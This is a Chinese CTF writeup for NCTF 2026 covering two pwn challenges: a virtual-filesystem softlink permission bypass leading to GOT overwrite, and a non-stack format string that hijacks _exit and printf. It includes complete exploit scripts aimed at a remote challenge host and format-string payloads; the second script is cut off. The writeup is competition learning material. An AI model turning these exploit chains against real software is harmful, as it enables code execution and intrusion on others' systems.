# [个人团队] NCTF2026的Writeup

> **2026年04月04日09:00 ~ 2026年04月05日21:00**
>
> **比赛地址：https://nctf.x1ct34m.com/games/2**
>
> **复现地址：https://nctf.x1ct34m.com/games/2**

> [![img](https://nctf.x1ct34m.com/assets/1cb2a1609b9e8f2dfe78a3214818ca9626b75d50b63d230b2e5ea359c62ac8bd/logo)](https://nctf.x1ct34m.com/)
>
> 4人赛
>
> # NCTF2026
>
> **495**支队伍已报名
>
> 开始时间
>
> 2026年4月4日上午9点00分
>
> 结束时间
>
> 2026年4月5日晚上9点00分
>
> 
>
> 比赛尚未开始
>
> 你已经以队伍 PKFC 成员身份成功报名并通过审核，请在比赛开始后进入比赛页面。
>
> ## 比赛时间：
>
> 4 月 4 日 9:00 - 4 月 5 日 21:00，共计 36h
>
> ## 比赛形式：
>
> 团队赛, 每队 1-4 人, 分为校内、校外两个赛道
>
> ## 比赛奖项：
>
> 校内和校外各设置一等奖, 二等奖, 三等奖
> 一等奖: 第 1 名, 每队 2000 元
> 二等奖: 第 2-3 名, 每队 1500 元
> 三等奖: 第 4-6 名, 每队 1000 元
>
> ## 比赛规则：
>
> 1. 比赛时间为 4 月 4 日 9:00 - 4 月 5 日 21:00, 共计 36h, 在此期间都可以注册账号并报名参赛
> 2. 比赛形式为团队赛, 每队 1-4 人, 分为校内、校外两个赛道
>    2.1 选手在注册账号之后, 需在战队处进行创建 (或加入) 队伍, 并选择合适的赛道
>    2.2 校内队伍的所有成员必须都为南京邮电大学在校学生 (不限制专业、年级、校区)
>    2.3 校内队伍禁止包含校外成员, 否则将被视为校外队伍
>    2.4 **校内选手务必在个人信息处填写学工号和姓名!**
> 3. 比赛采用动态 Flag, 格式为 nctf{...}
> 4. 比赛采用动态积分制, 赛题分值随解题人数的增加而递减, 直到达到最低分数为止
> 5. 禁止不同参赛队伍合作, 共享 flag、hint、解题思路等任何与比赛相关的内容
> 6. 禁止在比赛中妨碍其他队伍解题, 禁止对题目环境进行破坏
> 7. 禁止攻击比赛平台, 禁止向比赛平台和题目环境发送大量流量, 没有任何题目需要使用扫描器
> 8. 参赛队伍如有任何违规行为, 将被取消比赛资格
> 9. 比赛结束 24h 内, 校内外排名前 10 的队伍需要提交所有题目的 Writeup (解题报告, 格式为 PDF) 并发送至邮箱 [nctf@x1ct34m.com](mailto:nctf@x1ct34m.com), 否则将被视为取消获奖资格
> 10. **校内选手在提交 Writeup 时需在开头注明所有队员的学号、姓名、比赛平台ID**
> 11. 更多信息请关注平台公告和 NCTF 2026 QQ群 (884196088)
> 12. 比赛赛题和规则等相关内容的最终解释权归 X1cT34m 所有
>
> ## 比赛赞助
>
> 本次比赛服务器由 [DK 盾](https://www.dkdun.cn/) 独家赞助, 打造高性价比云服务器, 让广大 CTFer、学生群体早日上云
>
> 本次比赛平台基于 [GZ::CTF](https://github.com/GZTimeWalker/GZCTF)
>
> ## Time:
>
> UTC+8 April 4th, 9:00 AM - April 5th, 9:00 PM
>
> ## Team:
>
> Team competition, 1-4 people per team, divided into on-campus and off-campus tracks
>
> ## Awards:
>
> This competition features both on-campus and off-campus tracks, with first, second, and third prizes awarded on each track.
>
> First Prize: 1st Place, 2000 RMB + Certificate per team
>
> Second Prize: 2nd-3rd Place, 1500 RMB + Certificate per team
>
> Third Prize: 4th-6th Place, 1000 RMB + Certificate per team
>
> ## Rules
>
> 1. The competition will be held from UTC+8 9:00 AM on April 4th to 9:00 PM on April 5th, a total of 36 hours. Registration and participation are open during this period.
> 2. The competition is a team competition, with 1-4 members per team. There are two tracks: on-campus and off-campus.
>    2.1 After registering an account, participants must create (or join) a team in the team section and select the appropriate track.
>    2.2 All members of on-campus teams must be current students of Nanjing University of Posts and Telecommunications (regardless of major, year, or campus).
>    2.3 On-campus teams are prohibited from including off-campus members; otherwise, they will be considered off-campus teams.
>    2.4 On-campus participants must fill in their student ID and name in their personal information section.
> 3. The competition uses a dynamic flag, formatted as nctf{...}
> 4. The competition uses a dynamic scoring system. The score for each problem decreases as more participants solve it, until a minimum score is reached.
> 5. Cooperation between different participating teams is prohibited.
> 6. Sharing any content related to the competition, including flags, hints, and problem-solving strategies.
> 7. No interfering with other teams' problem-solving or disrupting the problem environment.
> 8. Attacking the competition platform or sending excessive traffic to the platform or problem environment is prohibited. No problem requires the use of a scanner.
> 9. Any team violating these rules will be disqualified.
> 10. Within 24 hours of the competition's conclusion, the top 10 teams (both on-campus track and off-campus track) must submit a writeup (solution report, PDF format) for all problems to [nctf@x1ct34m.com](mailto:nctf@x1ct34m.com); otherwise, they will be disqualified.
> 11. Participants from NJUPT must include the student ID, name, and competition platform ID of all team members at the beginning of their writeup submission.
> 12. For more information, please follow platform announcements and join the NCTF 2026 QQ group (884196088).
> 13. X1cT34m reserves the right to the final interpretation of the competition problems and rules.
>
> ## Sponsorship
>
> The server for this competition is exclusively sponsored by [DK](https://www.dkdun.cn/), providing high-performance cloud servers to enable CTF enthusiasts and students to migrate to the cloud as soon as possible.
>
> The competition platform is based on [GZ::CTF](https://github.com/GZTimeWalker/GZCTF)
>
> 
>
> GZ::CTF
>
> Copyright © 2022-2026 [@GZTimeWalker](https://github.com/GZTimeWalker), All Rights Reserved.
>
> [苏ICP备2026008980号-1](https://beian.miit.gov.cn/)



# Day0



# Day1

## Pwn

### VFS_Stack

> 题目附件：`attachment/pwn`、`attachment/libc.so.6`  
> 远端：`114.66.24.221:45910`

---

#### 0x00 题目目标

目标非常直接：

1. 完整分析附件程序逻辑；
2. 找到可利用漏洞，构造稳定利用链；
3. 打远端拿到 flag。

最终拿到的远端回显为：

`nctf{4n_1N73R3571n9_U53_OF_FuNc71on_P7r}`

---

#### 0x01 基础信息与保护

##### 1. ELF 信息

- `pwn`: 64 位、动态链接、**No PIE**、未 strip。
- `libc.so.6`: 给了题目 libc（Ubuntu GLIBC 2.39）。

##### 2. 保护情况（`checksec`）

- Partial RELRO
- No canary
- NX enabled
- No PIE
- SHSTK / IBT 打开

这里最关键的是：

- **No PIE**：主程序地址固定，GOT 地址固定；
- **Partial RELRO**：`.got.plt` 可写，可做 GOT 覆写；
- NX 开启：不能直接栈上 shellcode，优先考虑劫持函数指针/GOT。

---

#### 0x02 程序整体功能梳理

程序是一个简化 VFS，支持命令：

- `LIST`
- `READ <name> <len>`
- `WRITE <name> <len>`（随后发原始字节）
- `TOUCH <name>`
- `HARDLINK <src> <dst>`
- `SOFTLINK <src> <dst>`
- `QUIT`

核心函数：

- `cmd_touch`
- `cmd_read`
- `cmd_write`
- `cmd_hardlink`
- `cmd_softlink`
- `commit_write` / `do_commit`

---

#### 0x03 关键数据结构（逆向还原）

##### 1. inode 结构（大小 0x28）

通过 `find_inode/find_free_inode/cmd_*` 访问偏移可还原：

```c
typedef struct inode {
    char     name[0x10];   // +0x00
    uint32_t used;         // +0x10
    uint32_t owner;        // +0x14  (0=user, 1=admin-only)
    uint32_t type;         // +0x18  (0=regular, 1=hardlink, 2=softlink)
    uint32_t size;         // +0x1c
    uint8_t *data;         // +0x20
} inode_t;
```

`inode_accessible(inode*)` 只做一件事：

```c
return inode->owner == 0;
```

即 owner=0 才允许普通读写。

##### 2. 初始化出的系统文件

`init_system_files` 会创建两个 inode：

1. `user_readme`
   - owner=0
   - type=regular
   - size=0x80
2. `/dev/stack_core`
   - owner=1（admin-only）
   - type=regular
   - size=0x18
   - data 指向一个特殊结构体（里面有 `LNKPTR` 标记等）

所以正常情况下：`/dev/stack_core` 看得到但读不了（permission denied）。

---

#### 0x04 两个命令的核心逻辑（漏洞根因）

这一题要打通，必须把 `HARDLINK` 和 `SOFTLINK` 的组合行为看透。

---

##### 1. `cmd_hardlink` 做了什么

伪代码（关键路径）：

```c
src = find_inode(src_name);
dst = alloc_free_inode(dst_name);

// 仅允许 regular 做 hardlink
if (src->type != 0) error;

dst->used  = 1;
dst->owner = src->owner;     // 继承 owner
dst->type  = 1;              // hardlink
dst->size  = src->size;
dst->data  = pool_base + cursor;
memcpy(dst->data, src->data, src->size);  // 拷贝 src 数据内容
cursor += src->size;
```

重点：

- hardlink 不是共享指针，而是把 `src->data` 内容**拷贝一份 blob**；
- 对 `/dev/stack_core` 做 hardlink 时，这份 blob 里包含了 `LNKPTR` 等关键字段。

---

##### 2. `cmd_softlink` 做了什么

伪代码（关键路径）：

```c
src = find_inode(src_name);
dst = alloc_free_inode(dst_name);

if (src->type == 2) error;                 // 不允许 softlink->softlink
if (src->size <= 0x17 || !src->data) error;

blob = src->data;
if (memcmp(blob + 0x10, "LNKPTR", 6) != 0) error;

memset(dst, 0, 0x28);
copy_name(dst->name, dst_name);
dst->used = 1;
dst->type = 2;                             // softlink
dst->size = *(uint32_t*)(blob + 0x8);
dst->data = *(uint8_t**)(blob + 0x0);

if (src->type != 1) {
    dst->owner = *(uint32_t*)(blob + 0x0c);
}
// src->type == 1 时不会给 owner 赋值，保持 memset 后的 0
```

漏洞核心就一句：

**当 `src->type == hardlink(1)` 时，`dst->owner` 不会被赋值，保持 0。**

这就是权限绕过。

---

#### 0x05 漏洞利用如何一步步形成原语

利用链分三段：

1. 先做权限绕过，得到可读写的“假软链接文件” `s`；
2. 用 `s` 去改 inode 表，把 `/dev/stack_core` 改造成任意地址读写；
3. 泄露 libc + GOT 覆写拿 RCE。

---

##### 第一步：构造 `h` 和 `s`

先执行：

```text
HARDLINK /dev/stack_core h
SOFTLINK h s
```

结果：

- `h` 是 hardlink（owner=1），其 data 是 `/dev/stack_core` 内容的拷贝；
- 这个拷贝里有 `LNKPTR`，可通过 softlink 检查；
- `s` 从 `h` 构造出来时，因 `src->type==1` 走到了“漏赋值”路径，`owner` 留在 0。

这时 `s` 变成一个普通用户可读写文件。

---

##### 第二步：`READ s` 泄露 inode 表

`s->data` 与 `s->size` 来自 blob 头部，实际会指向 inode 表区域（大小约 `0x550`）。

所以：

```text
READ s 320
```

可以直接把前 8 个 inode（`8 * 0x28 = 0x140 = 320`）读出来。

我们需要定位 inode1（`/dev/stack_core`）在表中的偏移：

- inode0 偏移 `0x00`
- inode1 偏移 `0x28`

inode1 各字段偏移：

- owner: `0x28 + 0x14`
- type:  `0x28 + 0x18`
- size:  `0x28 + 0x1c`
- data:  `0x28 + 0x20`

---

##### 第三步：`WRITE s` 篡改 inode1（把 `/dev/stack_core` 武器化）

我们把 inode1 改为：

- owner = 0（绕过权限）
- type = 0（当普通文件处理）
- size = 可控（例如 8 或更大）
- data = 目标地址

写回后：

- `READ /dev/stack_core 8` = 从目标地址读 8 字节
- `WRITE /dev/stack_core 8` = 向目标地址写 8 字节

于是拿到稳定 **AAR/AAW**。

---

#### 0x06 信息泄露与控制流劫持

##### 1. 泄露 libc

选一个非 IFUNC 的 GOT 项最稳（比如 `write@got`）：

```text
target = elf.got['write']
leak   = *(uint64_t*)target
libc_base = leak - libc.sym['write']
```

远端实测所有关键符号都对齐到同一个基址（页对齐）`
0x...6e8000`，说明给的 libc 与远端匹配。

##### 2. 覆写 `strcmp@got -> system`

`menu_loop` 每次解析命令后都会调用很多次 `strcmp(cmd, "...")`。

把 `strcmp@got` 改成 `system` 后，第一次“比较命令”的地方就会执行：

```c
system(cmd)
```

因此我们只需再发送：

```text
sh
cat /flag
```

就可以在远端命令执行并读 flag。

---

#### 0x07 完整利用脚本（可直接打远端）

> 下面脚本就是实战版，直接打 `114.66.24.221:45910`。

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = '114.66.24.221', 45910

elf = ELF('./attachment/pwn')
libc = ELF('./attachment/libc.so.6')


def start():
    return remote(HOST, PORT)


def exploit():
    p = start()
    p.recvuntil(b'vfs> ')

    def cmd(line: bytes):
        p.sendline(line)

    def recv_prompt():
        return p.recvuntil(b'vfs> ', drop=False)

    def hardlink(src: bytes, dst: bytes):
        cmd(b'HARDLINK ' + src + b' ' + dst)
        return recv_prompt()

    def softlink(src: bytes, dst: bytes):
        cmd(b'SOFTLINK ' + src + b' ' + dst)
        return recv_prompt()

    def read_file(name: bytes, n: int):
        cmd(f'READ {name.decode()} {n}'.encode())
        data = recv_prompt()
        marker = f'DATA {n}\n'.encode()
        i = data.find(marker)
        if i < 0:
            return None
        st = i + len(marker)
        return data[st:st + n]

    def write_file(name: bytes, blob: bytes):
        cmd(f'WRITE {name.decode()} {len(blob)}'.encode())
        p.recvuntil(b'READY\n')
        p.send(blob)
        return recv_prompt()

    # ----------------------------
    # 1) 权限绕过：/dev/stack_core -> h -> s
    # ----------------------------
    hardlink(b'/dev/stack_core', b'h')
    softlink(b'h', b's')

    # ----------------------------
    # 2) 用 s 读写 inode 表，并改 inode1(/dev/stack_core)
    # ----------------------------
    inode1_off = 0x28

    def patch_core_inode(target_addr: int, size: int = 8, owner: int = 0, ftype: int = 0):
        table = bytearray(read_file(b's', 0x140))  # 8 * 0x28

        table[inode1_off + 0x14: inode1_off + 0x18] = p32(owner)
        table[inode1_off + 0x18: inode1_off + 0x1c] = p32(ftype)
        table[inode1_off + 0x1c: inode1_off + 0x20] = p32(max(size, 8))
        table[inode1_off + 0x20: inode1_off + 0x28] = p64(target_addr)

        write_file(b's', bytes(table))

    def aar_qword(addr: int) -> int:
        patch_core_inode(addr, 8)
        data = read_file(b'/dev/stack_core', 8)
        return u64(data)

    def aaw_qword(addr: int, val: int):
        patch_core_inode(addr, 8)
        write_file(b'/dev/stack_core', p64(val))

    # ----------------------------
    # 3) 泄露 libc + 覆写 strcmp@got
    # ----------------------------
    write_leak = aar_qword(elf.got['write'])
    libc_base = write_leak - libc.sym['write']
    system_addr = libc_base + libc.sym['system']

    log.success(f'write@libc = {hex(write_leak)}')
    log.success(f'libc_base  = {hex(libc_base)}')
    log.success(f'system     = {hex(system_addr)}')

    aaw_qword(elf.got['strcmp'], system_addr)
    log.success('overwrite strcmp@got -> system done')

    # ----------------------------
    # 4) 触发命令执行并读 flag
    # ----------------------------
    cmd(b'sh')
    p.sendline(b'cat /flag')
    flag = p.recvline(timeout=2)
    print(flag.decode(errors='ignore').strip())

    p.close()


if __name__ == '__main__':
    exploit()
```

---

#### 0x08 远端实战结果

成功回显：

`nctf{4n_1N73R3571n9_U53_OF_FuNc71on_P7r}`

---

#### 0x09 这题设计亮点（出题思路）

这题最精彩的是“看起来像文件系统逻辑 bug，实际上是权限 + 指针语义混淆 + 函数指针/GOT 利用链”。

核心亮点：

1. `softlink` 对 `src->type==hardlink` 的分支漏了 owner 赋值；
2. `/dev/stack_core` 这个“系统文件”结构里嵌了 `LNKPTR` 风格 blob，可被链式解释；
3. 通过合法命令序列拿到 AAR/AAW，无需 OOB/UAF；
4. 配合 Partial RELRO，直接走 GOT 覆写拿代码执行。

这是一道非常典型、非常优雅的 CTF pwn 业务逻辑题。



### checkin

#### 题目信息

- 题目类型：`pwn`
- 附件：
  - `pwn`
  - `libc.so.6`
  - `ld-linux-x86-64.so.2`
- 最终拿到的 flag：

```text
flag{900d_W0rK_f0R_cH3ck1n!_574R7_Y0Ur_NC7F_pl33Z}
```

这题的关键点不在“有没有 fmt”，而在“这是一个**不在栈上的格式化字符串**”。  
很多人看到 `printf(buf)` 会本能想到“把地址拼到 payload 尾部，再 `%n` 写”，但这题的 `buf` 在 `.bss`，不是栈，所以常规打法会失效。真正的突破口，是利用 `printf` 读取**残留寄存器 / 栈槽里的伪参数**，先把“某个未来参数槽”改造成我们想要的地址，再继续 `%n/%hn` 写。

---

#### 1. 附件初步分析

目录里只有三个文件：

```text
ld-linux-x86-64.so.2
libc.so.6
pwn
```

这类组合基本意味着：

1. 本地调试要使用题目给的 loader 和 libc。
2. 远程大概率也是同一套 libc 环境。

本地运行建议：

```bash
/mnt/kali_share/checkin/attachment/ld-linux-x86-64.so.2 \
  --library-path /mnt/kali_share/checkin/attachment \
  /mnt/kali_share/checkin/attachment/pwn
```

---

#### 2. 保护与 ELF 结构

从 `readelf` / `objdump` 可以看出：

- `Type: EXEC`，说明 **No PIE**
- `GNU_STACK` 没有执行权限，说明 **NX 开启**
- 存在 `GNU_RELRO`，但没有 `BIND_NOW`，说明是 **Partial RELRO**
- 程序未 strip，符号还在

这对利用非常友好：

- 代码段基址固定，`main`、GOT 等地址可直接写死
- GOT 可写

与利用相关的 GOT：

```text
_exit@got   = 0x404000
puts@got    = 0x404008
printf@got  = 0x404010
read@got    = 0x404018
setvbuf@got = 0x404020
```

程序里一个非常关键的全局变量：

```text
buf = 0x404080
```

它在 `.bss`，不是栈。

---

#### 3. 主逻辑逆向

`main` 的核心反汇编非常短，逻辑如下：

```c
setvbuf(stdin,  0, 2, 0);
setvbuf(stdout, 0, 2, 0);
setvbuf(stderr, 0, 2, 0);

puts("Please checkin first");
read(0, buf, 0x100);
printf(buf);
_exit(0);
```

也就是：

1. 打印提示
2. 从标准输入读 `0x100` 字节到 `buf`
3. 直接把 `buf` 当格式串传给 `printf`
4. 最后 `_exit(0)`

漏洞点就是：

```c
printf(buf);
```

这当然是格式化字符串漏洞，但这题的难点是：

- `buf` 在 `.bss`
- 所以**不能**像常规栈 fmt 那样，把若干目标地址直接放在 payload 后面，再用 `%6$n`、`%7$hn` 去取

---

#### 4. 为什么“非栈上 fmt”依然能打

虽然 `printf(buf)` 只显式传了一个参数，但它是个变参函数。  
在 x86_64 SysV ABI 下，`printf` 取变参时会去读：

- `rsi`
- `rdx`
- `rcx`
- `r8`
- `r9`
- 以及调用者栈上的后续槽位

而此时这些寄存器 / 栈槽并不会自动清零，它们往往保留了调用 `printf` 前的残值。

本题刚好就是这样：

- `printf` 之前执行的是 `read(0, buf, 0x100)`
- 因此残留参数里天然出现了：
  - `buf`
  - `0x100`
  - libc 指针
  - 栈指针
  - 代码地址
  - 甚至某些“指向其他参数槽”的指针链

也就是说，虽然我们不能把地址塞进栈里，但我们能：

1. 先消费前面的伪参数
2. 用 `%n/%hn` 改写某个“未来参数槽”
3. 让未来参数槽变成我们想要的目标地址
4. 再继续消费参数，用新的目标地址完成真正写入

这就是整题的核心。

---

#### 5. 第一轮参数探测

先用位置参数把第 1 轮的伪参数布局打出来：

```text
%1$p|%2$p|%3$p|...
```

本地稳定可见的关键值大致如下：

| 位置    | 值            | 含义               |
| ------- | ------------- | ------------------ |
| `%1$p`  | `0x404080`    | `buf`              |
| `%2$p`  | `0x100`       | `read` 的长度参数  |
| `%3$p`  | `0x7f...ba91` | libc 内地址        |
| `%8$p`  | 栈指针        | 可写链起点之一     |
| `%11$p` | `0x4011b6`    | `main`             |
| `%16$p` | `0x403e00`    | 一个后续可改写槽位 |

注意：

- `%3$p` 是一个稳定的 libc 指针
- 本地对照 `/proc/<pid>/maps` 可得：

```text
libc_base = leak - 0x11ba91
```

因此第 1 轮就可以顺手把 libc 基址泄出来。

---

#### 6. 如何发现“arg8 -> arg16”这条链

这个方法非常重要，后面所有链子都是这样测出来的。

##### 6.1 测试方法

构造这种测试串：

```text
%c%c%c%c%c%c%c%n|%p|%p|%p|...
```

含义是：

1. 先用 7 个 `%c` 消耗前 7 个参数
2. 第 8 个参数交给 `%n`
3. `%n` 会把“当前已输出字符数”写到它指向的地址里
4. 然后继续把后面的很多槽位用 `%p` 打印出来

如果后面某个位置突然变成了 `0x7`，说明：

- 第 8 个参数指向的，就是那个槽位的内存

##### 6.2 结果

实测可得到：

```text
arg8  -> arg16
```

也就是说：

- 当 `%n/%hn` 吃到第 8 个参数时
- 它实际写到的是“第 16 个参数槽”的内容

而第 16 个参数槽原本是：

```text
0x403e00
```

这就给了我们一个很有用的能力：

- 先改 arg16
- 再把 arg16 当成真正的目标指针来用

---

#### 7. 第一阶段目标：泄 libc 并把 `_exit@got` 改回 `main`

程序每次 `printf` 完都会执行：

```c
_exit(0);
```

如果不处理它，我们只有一轮输入，利用空间太小。  
所以第 1 轮的任务是：

1. 泄 libc
2. 把 `_exit@got` 改成 `main`
3. 让程序退出时实际上重新跳回 `main`

这样程序就“变成一个循环服务”。

##### 7.1 为什么只改 `_exit@got` 的低 2 字节就够

`_exit@got = 0x404000`，它在 lazy binding 阶段还没真正解析时，槽里一般是指向本程序 PLT 附近的地址，也就是：

```text
0x000000000040xxxx
```

而 `main = 0x4011b6` 也在同一个代码段里。  
因此只要把低 2 字节改成 `0x11b6`，整个指针就能落到 `main`。

这就省掉了完整 8 字节覆盖。

##### 7.2 第一阶段 payload

最终稳定使用的第 1 轮 payload 是：

```text
%c%c%p|%c%c%c%16364c%hn%c%c%c%c%c%c%53680c%hn
```

发送时末尾要补 `\x00`。

##### 7.3 这串 payload 是怎么推出来的

###### 第一步：前面先做 leak

```text
%c%c%p|
```

- 两个 `%c` 吃掉 arg1、arg2
- `%p` 吃掉 arg3，直接泄出 libc 指针
- `|` 只是分隔符

此时累计输出字符数为：

```text
2 + len(%3$p) + 1
```

这里 `%3$p` 形如 `0x7fxxxxxxxxxx`，在本题环境里稳定是 14 个字符，所以：

```text
2 + 14 + 1 = 17
```

###### 第二步：把 arg16 改成 `0x404000`

接下来：

```text
%c%c%c%16364c%hn
```

解释：

- 3 个 `%c` 再吃掉 arg4、arg5、arg6，计数到 `20`
- `%16364c` 吃掉 arg7，输出 `16364` 个字符
- 总计：

```text
20 + 16364 = 16384 = 0x4000
```

- 接下来的 `%hn` 吃到 arg8
- 而 arg8 指向 arg16
- 所以 arg16 从原来的 `0x403e00` 被改成：

```text
0x404000
```

也就是 `_exit@got`

###### 第三步：把 `_exit@got` 改成 `main`

后面：

```text
%c%c%c%c%c%c%53680c%hn
```

解释：

- 6 个 `%c` 吃掉 arg9~arg14
- 此时计数从 `0x4000` 变成 `0x4006`
- `%53680c` 吃掉 arg15，令总计达到：

```text
0x4006 + 53680 = 70070
70070 mod 0x10000 = 0x11b6
```

- 最后的 `%hn` 吃到 arg16
- 而 arg16 现在已经是 `_exit@got`
- 所以 `_exit@got` 被写成：

```text
0x4011b6
```

即 `main`

##### 7.4 第一阶段执行后的效果

本轮结束时程序会调用 `_exit(0)`，但由于 GOT 已被改掉，实际跳到的是 `main`，于是提示再次出现：

```text
Please checkin first
```

到这里，题目就从“一次性交互”变成了“可多轮利用”。

---

#### 8. 为什么第二轮必须重新测参数布局

很多 fmt 题里，一轮和下一轮的参数布局会变。  
这题也一样。

因为我们已经把 `_exit` 劫持回 `main`，等于进程在同一栈上又递归进入了一层 `main`。  
递归后：

- 栈深度变了
- 某些残留参数变了
- 原来可用的参数链不一定还可用

所以第二轮不能偷懒，必须重新 dump。

---

#### 9. 第二轮关键参数布局

第 2 轮（也就是递归后的第一次新输入）实测有这些关键槽位：

| 位置    | 值            | 作用               |
| ------- | ------------- | ------------------ |
| `%3$p`  | `0x7f...ba91` | 依然可泄 libc      |
| `%10$p` | 栈指针        | 可改写 `%18$`      |
| `%18$p` | `0x404000`    | 一个天然的低地址槽 |
| `%28$p` | 栈指针        | 可改写 `%40$`      |
| `%40$p` | `(nil)`       | 适合被我们造指针   |

继续用前面讲的“`%c...%n` 后看谁变成小整数”的办法，可以测出两条特别好用的链：

```text
arg10 -> arg18
arg28 -> arg40
```

这两条链正好够我们在第 2 轮里做两件事：

1. 把 arg18 改成 `printf@got`
2. 把 arg40 改成 `printf@got+2`

然后分别用 `%hn` 写入 `system` 地址的低 16 位和次低 16 位。

---

#### 10. 为什么第二轮要改 `printf@got`

我们已经能循环了，下一步最自然的目标是：

```text
printf@got -> system
```

原因非常直接：

- 每轮流程都是 `read -> printf`
- 如果把 `printf` 换成 `system`
- 那么下一轮发进去的内容，就会被当成 shell 命令执行

这比劫持 `read`、`puts` 等都更顺手。

---

#### 11. 为什么只需要覆盖 `printf@got` 的低 4 字节

此时 `printf@got` 里已经是**真实的 libc 函数地址**了。  
而 `system` 和 `printf` 在同一个 libc 映射中，所以它们的高 4 字节相同。

因此我们只需要覆盖：

- `printf@got`      的低 2 字节
- `printf@got + 2`  的次低 2 字节

高 4 字节保持不变，整个 8 字节指针就会从 `printf` 变成 `system`。

这就是为什么第二阶段只要两次 `%hn` 就够。

---

#### 12. 第二阶段 payload 的构造过程

本地已知：

```text
printf@got = 0x404010
```

远程每次由第 1 轮泄漏得到：

```text
libc_base = leak - 0x11ba91
system    = libc_base + 0x58750
```

设：

```text
low16 = system & 0xffff
mid16 = (system >> 16) & 0xffff
```

第二阶段的构造逻辑如下。

##### 12.1 第一步：把 arg18 从 `0x404000` 改成 `0x404010`

利用 `arg10 -> arg18`：

```text
%c * 8
%16392c
%hn
```

因为：

- 前 8 个 `%c` 输出 8 个字符
- `%16392c` 再输出 16392 个字符
- 总计：

```text
8 + 16392 = 16400 = 0x4010
```

- 此时 `%hn` 吃到 arg10
- arg10 指向 arg18
- arg18 原来是 `0x404000`
- 低 2 字节被写成 `0x4010`

于是：

```text
arg18 = 0x404010 = printf@got
```

##### 12.2 第二步：通过 arg18 把 `printf@got` 写成 `system` 的低 16 位

接着：

```text
%c * 6
%{w2}c
%hn
```

其中：

```python
w2 = (low16 - 0x4010 - 6) & 0xffff
```

原因：

- 上一步结束时计数是 `0x4010`
- 再输出 6 个 `%c`，变成 `0x4016`
- 再输出 `w2` 个字符，计数就变成 `low16`
- 这时 `%hn` 吃到 arg18
- arg18 已经是 `printf@got`

于是：

```text
*(uint16_t *)printf@got = low16(system)
```

##### 12.3 第三步：把 arg40 改成 `printf@got+2`

这里不能只用 `%hn`，因为 arg40 初始是 `NULL`，我们需要一次把它造成立即可用的低地址指针。  
所以这里用的是 `%n`，直接写 4 字节。

利用 `arg28 -> arg40`：

```text
%c * 8
%{w3}c
%n
```

其中：

```python
c18 = 0x4010 + 6 + w2     # 第二步写 low16 前的累计值，实际上就是 low16
w3  = 0x404012 - (c18 + 8)
```

解释：

- 第二步结束时，累计输出字符数就是 `low16`
- 再输出 8 个 `%c`，得到 `low16 + 8`
- 再通过一个超宽 `%c` 把总输出数堆到：

```text
0x404012
```

- `%n` 吃到 arg28
- arg28 指向 arg40

于是 arg40 被写成：

```text
0x404012 = printf@got + 2
```

##### 12.4 第四步：通过 arg40 写入 `system` 的次低 16 位

最后：

```text
%c * 10
%{w4}c
%hn
```

其中：

```python
w4 = (mid16 - 0x4012 - 10) & 0xffff
```

为什么这里是 `0x4012` 而不是 `0x404012`？

因为 `%hn` 只写低 16 位，  
当前计数是 `0x404012`，它模 `0x10000` 后等于 `0x4012`。

再经过：

- 10 个 `%c`
- `w4` 个宽度填充

就能把模 `0x10000` 的结果调到 `mid16(system)`。

最后 `%hn` 吃到 arg40，也就是：

```text
printf@got + 2
```

因此：

```text
*(uint16_t *)(printf@got + 2) = mid16(system)
```

到这里，`printf@got` 已经被完整改成 `system`。

---

#### 13. 第三阶段：把输入当命令直接喂给 `system`

第二阶段结束后，下一轮程序仍然会执行：

```c
read(0, buf, 0x100);
printf(buf);
```

但这时 `printf@got` 已经变成了 `system@libc`，所以实际效果是：

```c
read(0, buf, 0x100);
system(buf);
```

于是第三轮只要发命令串即可。

##### 13.1 为什么我最终没有起交互 shell

一开始也可以做成：

```text
/bin/sh\x00
```

但远程容器有时：

- 连接不稳定
- 交互 shell 不够干净
- 后续输入可能被 `read`/包装器打断

所以最终 exp 采用了更稳的方式：

- 第三轮直接发送一条命令串
- 让 `system()` 一次性把 flag 打出来

例如：

```sh
echo __FLAG_BEGIN__;
cat /flag 2>&1;
cat /flag.txt 2>&1;
cat flag 2>&1;
cat flag.txt 2>&1;
find / -maxdepth 3 -name 'flag*' -type f -exec cat {} \; 2>&1;
echo __FLAG_END__;
```

这样：

- 不需要维持交互 shell
- 结果更容易从大段 fmt 噪音里截出来

---

#### 14. 为什么 payload 末尾都要补 `\x00`

这点非常重要。

程序用的是：

```c
read(0, buf, 0x100);
```

`read` **不会**自动追加字符串终止符。  
而 `printf(buf)` / `system(buf)` 都依赖 `buf` 是 C 字符串。

所以我们发送 payload 时必须手动加：

```text
\x00
```

否则：

- `printf` 可能继续把旧的 `.bss` 内容也当格式串解析
- `system` 可能把后面残留字节也当命令的一部分

这会导致利用非常不稳定。

---

#### 15. 最终利用脚本

我实际落地的 exp 保存在：

[`/home/kali/agent/exploit.py`](/home/kali/agent/exploit.py)

核心思路就是上面的三阶段。  
这里贴一份最终脚本，方便完整复现：

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import sys
import time


READ_RET_OFF = 0x11BA91
SYSTEM_OFF = 0x58750

STAGE1 = b"%c%c%p|%c%c%c%16364c%hn%c%c%c%c%c%c%53680c%hn\x00"
START_MARK = b"__FLAG_BEGIN__"
END_MARK = b"__FLAG_END__"


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(65536)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def build_stage2(system_addr: int) -> bytes:
    low16 = system_addr & 0xFFFF
    mid16 = (system_addr >> 16) & 0xFFFF

    w1 = 0x4010 - 8
    w2 = (low16 - 0x4010 - 6) & 0xFFFF
    if w2 == 0:
        w2 = 0x10000

    c18 = 0x4010 + 6 + w2
    w3 = 0x404012 - (c18 + 8)
    w4 = (mid16 - 0x4012 - 10) & 0xFFFF
    if w4 == 0:
        w4 = 0x10000

    payload = (
        "%c" * 8
        + f"%{w1}c"
        + "%hn"
        + "%c" * 6
        + f"%{w2}c"
        + "%hn"
        + "%c" * 8
        + f"%{w3}c"
        + "%n"
        + "%c" * 10
        + f"%{w4}c"
        + "%hn"
    )
    return payload.encode() + b"\x00"


def exploit(host: str, port: int) -> bytes:
    last_err = None
    for attempt in range(1, 21):
        try:
            with socket.create_connection((host, port), timeout=10.0) as sock:
                sock.settimeout(10.0)

                sock.sendall(STAGE1)
                out = recv_until(sock, b"Please checkin first\n", timeout=10.0)
                if not out:
                    raise RuntimeError("empty response after stage1")

